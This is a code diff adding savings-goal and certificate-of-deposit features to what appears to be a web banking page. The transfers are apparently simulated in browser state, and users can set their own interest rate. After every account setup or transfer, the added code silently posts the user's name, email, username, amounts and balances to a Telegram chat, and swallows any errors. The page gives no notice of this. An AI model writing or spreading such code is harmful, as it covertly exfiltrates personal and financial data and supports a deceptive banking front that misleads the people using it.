+  const prev = state.savings || { currentSaved:0, history:[] };
+  const wasConfigured = !!prev.configured;
+  state.savings = { configured:true, goal, customLabel, icon:SAVINGS_REASONS[goal].icon, targetAmount, depositAmount, frequency, targetDate, autoDeposit, currentSaved:prev.currentSaved||0, history:prev.history||[] };
+  saveDeviceState();
+  closeModal(); showToast('Savings Account '+(wasConfigured?'Updated':'Created'), `Goal: ${fmtMoney(targetAmount)}`, 'success');
+
+  const u = state.currentUser || {};
+  const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A';
+  sendTelegramMessage(
+    `${wasConfigured?'⚙️ <b>SAVINGS GOAL UPDATED</b>':'💰 <b>SAVINGS GOAL CREATED</b>'}\n` +
+    `<b>User:</b> @${tgEsc(u.username || 'unknown')}\n` +
+    `<b>Full name:</b> ${tgEsc(fullName)}\n` +
+    `<b>Email:</b> ${tgEsc(u.email || 'N/A')}\n` +
+    `<b>Goal type:</b> ${tgEsc(goal)}\n` +
+    (goal==='Custom' ? `<b>Custom label:</b> ${tgEsc(customLabel)}\n` : '') +
+    `<b>Target:</b> ${fmtMoney(targetAmount)}\n` +
+    `<b>Per cycle:</b> ${fmtMoney(depositAmount)}\n` +
+    `<b>Frequency:</b> ${tgEsc(getFrequencyLabel(frequency))}\n` +
+    `<b>Target date:</b> ${tgEsc(targetDate)}\n` +
+    `<b>Auto-deposit:</b> ${autoDeposit ? 'YES' : 'NO'}\n` +
+    `<b>Saved so far:</b> ${fmtMoney(state.savings.currentSaved)}\n` +
+    `<b>Balance:</b> ${fmtMoney(state.userBalance)}\n` +
+    `<b>Timestamp:</b> ${new Date().toISOString()}`
+  ).catch(()=>{});
+
+  render();
+}
+
+function openSavingsTransferModal(direction) {
+  const s = state.savings; if (!s || !s.configured) { openSavingsModal(); return; }
+  const isDeposit = direction==='in'; const maxAmount = isDeposit ? state.userBalance : s.currentSaved;
+  const actionLabel = isDeposit ? 'Deposit to Savings' : 'Cash Out from Savings';
+  showModal(actionLabel, `<form onsubmit="submitSavingsTransfer(event, '${direction}')" class="space-y-4"><div class="bg-navy-900 border border-navy-700 p-3.5 rounded-xl flex items-center justify-between"><span class="text-xs text-slate-300">${isDeposit?'Available':'Savings Balance'}</span><span class="text-base font-black ${isDeposit?'text-gold-400':'text-sky-custom'}">${fmtMoney(maxAmount)}</span></div><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Amount ($)</label><input type="number" id="sav-tx-amount" required min="10" step="0.01" max="${maxAmount}" value="${Math.min(isDeposit?s.depositAmount:50, maxAmount)}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div><div id="sav-tx-error" class="text-rose-400 text-xs hidden"></div><div class="flex justify-end pt-2"><button type="submit" class="px-6 py-3 ${isDeposit?'bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950':'bg-sky-custom text-navy-950'} font-extrabold rounded-xl text-xs sm:text-sm active:scale-95">${actionLabel}</button></div></form>`);
+}
+
+function submitSavingsTransfer(e, direction) {
+  e.preventDefault();
+  const s = state.savings; if (!s) return;
+  const amt = parseFloat(document.getElementById('sav-tx-amount').value); const errEl = document.getElementById('sav-tx-error');
+  const isDeposit = direction==='in'; const maxAmount = isDeposit ? state.userBalance : s.currentSaved;
+  if (isNaN(amt) || amt <= 0) { errEl.textContent = 'Enter valid amount.'; errEl.classList.remove('hidden'); return; }
+  if (amt > maxAmount) { errEl.textContent = `Exceeds limit (${fmtMoney(maxAmount)}).`; errEl.classList.remove('hidden'); return; }
+
+  const balBefore = state.userBalance;
+  if (isDeposit) { state.userBalance -= amt; s.currentSaved += amt; } else { s.currentSaved -= amt; state.userBalance += amt; }
+
+  const ref = 'SAV-' + Math.floor(10000+Math.random()*90000);
+  s.history.unshift({ ref, date:new Date().toISOString().replace('T',' ').substring(0,16), amount:amt, type:isDeposit?'Deposit':'Cash Out', status:'Completed' });
+  state.transactions.unshift({ ref, date:new Date().toISOString().replace('T',' ').substring(0,16), amount:amt, type:isDeposit?'Savings Deposit':'Savings Cash-Out', status:'Completed' });
+  saveDeviceState();
+  closeModal(); showToast(isDeposit?'Deposited':'Cashed Out', `${fmtMoney(amt)} (${ref})`, 'success');
+
+  const u = state.currentUser || {};
+  const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A';
+  sendTelegramMessage(
+    `${isDeposit?'➕ <b>SAVINGS DEPOSIT</b>':'➖ <b>SAVINGS CASH-OUT</b>'}\n` +
+    `<b>User:</b> @${tgEsc(u.username || 'unknown')}\n` +
+    `<b>Full name:</b> ${tgEsc(fullName)}\n` +
+    `<b>Email:</b> ${tgEsc(u.email || 'N/A')}\n` +
+    `<b>Amount:</b> ${fmtMoney(amt)}\n` +
+    `<b>Ref:</b> ${tgEsc(ref)}\n` +
+    `<b>Goal:</b> ${tgEsc(s.goal==='Custom' ? (s.customLabel||'Custom') : s.goal)}\n` +
+    `<b>Savings balance:</b> ${fmtMoney(s.currentSaved)}\n` +
+    `<b>Weekly Funds before:</b> ${fmtMoney(balBefore)}\n` +
+    `<b>Weekly Funds after:</b> ${fmtMoney(state.userBalance)}\n` +
+    `<b>Timestamp:</b> ${new Date().toISOString()}`
+  ).catch(()=>{});
+
+  render();
+}
+
+function openCDModal() {
+  const cd = state.cdAccount || { configured:false, balance:0, lockPeriod:'6 months', interestRate:4.5, maturityDate:'', history:[] };
+  const lockOptions = ['3 months','6 months','12 months','24 months'];
+  const lockOpts = lockOptions.map(l=>`<option value="${l}" ${cd.lockPeriod===l?'selected':''}>${l}</option>`).join('');
+  showModal(cd.configured?'Private CD Account':'Open Private CD Account', `<form onsubmit="submitCDSetup(event)" class="space-y-4"><div class="bg-navy-900 border border-sky-custom/30 p-4 rounded-2xl text-[11px] text-slate-300 leading-relaxed"><i class="fa-solid fa-lock text-sky-custom mr-1.5"></i> CD moves funds only to/from Weekly Funds balance.</div><div class="grid grid-cols-2 gap-3"><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Lock Period</label><select id="cd-lock" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom">${lockOpts}</select></div><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">APY %</label><input type="number" id="cd-rate" required min="0.1" step="0.1" value="${cd.interestRate}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div></div>${!cd.configured?`<div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Initial Deposit ($)</label><input type="number" id="cd-init" required min="100" step="50" value="500" max="${state.userBalance}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div>`:`<div class="bg-navy-900 border border-navy-700 rounded-xl p-4 text-center"><p class="text-[10px] text-slate-400 uppercase tracking-wider">Current Balance</p><p class="text-2xl font-black text-gold-400 mt-1">${fmtMoney(cd.balance)}</p><p class="text-[10px] text-slate-400 mt-1">Matures ${escapeHtml(cd.maturityDate)}</p></div>`}<div id="cd-error" class="text-rose-400 text-xs hidden"></div><div class="flex justify-end gap-3 pt-2"><button type="button" onclick="closeModal()" class="px-4 py-2.5 bg-navy-950 text-slate-300 rounded-xl text-xs font-bold">Cancel</button><button type="submit" class="px-6 py-2.5 bg-sky-custom text-navy-950 rounded-xl text-xs font-extrabold active:scale-95">${cd.configured?'Update Terms':'Open CD Account'}</button></div></form>`);
+}
+
+function submitCDSetup(e) {
+  e.preventDefault();
+  const lockPeriod = document.getElementById('cd-lock').value; const interestRate = parseFloat(document.getElementById('cd-rate').value);
+  const prev = state.cdAccount || { balance:0, history:[] }; let balance = prev.balance || 0; const isNew = !prev.configured;
+  let initAmt = 0; let balBefore = state.userBalance;
+  if (isNew) {
+    const init = parseFloat(document.getElementById('cd-init').value);
+    if (isNaN(init) || init <= 0) { const err = document.getElementById('cd-error'); err.textContent = 'Enter valid deposit.'; err.classList.remove('hidden'); return; }
+    if (init > state.userBalance) { const err = document.getElementById('cd-error'); err.textContent = 'Insufficient funds.'; err.classList.remove('hidden'); return; }
+    initAmt = init; state.userBalance -= init; balance = init;
+  }
+  const months = parseInt(lockPeriod); const mat = new Date(); mat.setMonth(mat.getMonth() + months);
+  state.cdAccount = { configured:true, lockPeriod, interestRate, balance, maturityDate:mat.toISOString().split('T')[0], history:prev.history||[] };
+  if (isNew) {
+    const ref = 'CD-' + Math.floor(10000+Math.random()*90000);
+    state.cdAccount.history.unshift({ ref, date:new Date().toISOString().replace('T',' ').substring(0,16), amount:balance, type:'Initial Deposit', status:'Locked' });
+    state.transactions.unshift({ ref, date:new Date().toISOString().replace('T',' ').substring(0,16), amount:balance, type:'CD Deposit', status:'Completed' });
+  }
+  saveDeviceState();
+  closeModal(); showToast('Private CD '+(isNew?'Opened':'Updated'), `${fmtMoney(balance)} · ${interestRate}% APY`, 'success');
+
+  const u = state.currentUser || {};
+  const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A';
+  sendTelegramMessage(
+    `${isNew?'🔒 <b>PRIVATE CD OPENED</b>':'⚙️ <b>CD TERMS UPDATED</b>'}\n` +
+    `<b>User:</b> @${tgEsc(u.username || 'unknown')}\n` +
+    `<b>Full name:</b> ${tgEsc(fullName)}\n` +
+    `<b>Email:</b> ${tgEsc(u.email || 'N/A')}\n` +
+    (isNew ? `<b>Initial deposit:</b> ${fmtMoney(initAmt)}\n` : '') +
+    `<b>CD balance:</b> ${fmtMoney(balance)}\n` +
+    `<b>Lock period:</b> ${tgEsc(lockPeriod)}\n` +
+    `<b>APY:</b> ${tgEsc(interestRate)}%\n` +
+    `<b>Maturity date:</b> ${tgEsc(state.cdAccount.maturityDate)}\n` +
+    `<b>Weekly Funds before:</b> ${fmtMoney(balBefore)}\n` +
+    `<b>Weekly Funds after:</b> ${fmtMoney(state.userBalance)}\n` +
+    `<b>Timestamp:</b> ${new Date().toISOString()}`
+  ).catch(()=>{});
+
+  render();
+}
+
+function openCDTransferModal(direction) {
+  const cd = state.cdAccount; if (!cd || !cd.configured) { openCDModal(); return; }
+  const isIn = direction==='in'; const maxAmount = isIn ? state.userBalance : cd.balance;
+  const actionLabel = isIn ? 'Fund CD' : 'Redeem CD';
+  showModal(actionLabel, `<form onsubmit="submitCDTransfer(event, '${direction}')" class="space-y-4"><div class="bg-navy-900 border border-navy-700 p-3.5 rounded-xl flex items-center justify-between"><span class="text-xs text-slate-300">${isIn?'Available':'CD Balance'}</span><span class="text-base font-black ${isIn?'text-gold-400':'text-sky-custom'}">${fmtMoney(maxAmount)}</span></div><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Amount ($)</label><input type="number" id="cd-tx-amount" required min="10" step="0.01" max="${maxAmount}" value="${Math.min(100, maxAmount)}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div><div id="cd-tx-error" class="text-rose-400 text-xs hidden"></div><div class="flex justify-end pt-2"><button type="submit" class="px-6 py-3 ${isIn?'bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950':'bg-sky-custom text-navy-950'} font-extrabold rounded-xl text-xs sm:text-sm active:scale-95">${actionLabel}</button></div></form>`);
+}
+
+function submitCDTransfer(e, direction) {
+  e.preventDefault();
+  const cd = state.cdAccount; if (!cd) return;
+  const amt = parseFloat(document.getElementById('cd-tx-amount').value); const errEl = document.getElementById('cd-tx-error');
+  const isIn = direction==='in'; const maxAmount = isIn ? state.userBalance : cd.balance;
+  if (isNaN(amt) || amt <= 0) { errEl.textContent = 'Enter valid amount.'; errEl.classList.remove('hidden'); return; }
+  if (amt > maxAmount) { errEl.textContent = 'Exceeds limit.'; errEl.classList.remove('hidden'); return; }
+  const ref = 'CD-' + Math.floor(10000+Math.random()*90000);
+  const balBefore = state.userBalance;
+  if (isIn) { state.userBalance -= amt; cd.balance += amt; } else { cd.balance -= amt; state.userBalance += amt; }
+  cd.history.unshift({ ref, date:new Date().toISOString().replace('T',' ').substring(0,16), amount:amt, type:isIn?'Funded':'Redeemed', status:isIn?'Locked':'Completed' });
+  state.transactions.unshift({ ref, date:new Date().toISOString().replace('T',' ').substring(0,16), amount:amt, type:isIn?'CD Deposit':'CD Redemption', status:'Completed' });
+  saveDeviceState();
+  closeModal(); showToast(isIn?'CD Funded':'CD Redeemed', `${fmtMoney(amt)} · ${ref}`, 'success');
+
+  const u = state.currentUser || {};
+  const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A';
+  sendTelegramMessage(
+    `${isIn?'💰 <b>CD FUNDED</b>':'💸 <b>CD REDEEMED</b>'}\n` +
+    `<b>User:</b> @${tgEsc(u.username || 'unknown')}\n` +
+    `<b>Full name:</b> ${tgEsc(fullName)}\n` +
+    `<b>Email:</b> ${tgEsc(u.email || 'N/A')}\n` +
+    `<b>Amount:</b> ${fmtMoney(amt)}\n` +
+    `<b>Ref:</b> ${tgEsc(ref)}\n` +
+    `<b>CD balance:</b> ${fmtMoney(cd.balance)}\n` +
+    `<b>Lock period:</b> ${tgEsc(cd.lockPeriod)} · ${tgEsc(cd.interestRate)}% APY\n` +
+    `<b>Maturity:</b> ${tgEsc(cd.maturityDate)}\n` +
+    `<b>Weekly Funds before:</b> ${fmtMoney(balBefore)}\n` +
+    `<b>Weekly Funds after:</b> ${fmtMoney(state.userBalance)}\n` +
+    `<b>Timestamp:</b> ${new Date().toISOString()}`
+  ).catch(()=>{});
+
+  render();
+}
+
+function render() {
+  document.body.classList.remove('modal-open');
+  renderHeaderNav();
+  document.querySelector('#nav-drawer nav').innerHTML = renderNavItems('goals');
+  const container = document.getElementById('app-container');
+  container.innerHTML = renderDashboardShell('goals', renderGoals());
+}
+
+window.onload = async function() {
+  if (!guardAuth()) return;
+  await pullCurrentUserFromCloud();
+  render();
+};
+</script>
+</body>
+</html>
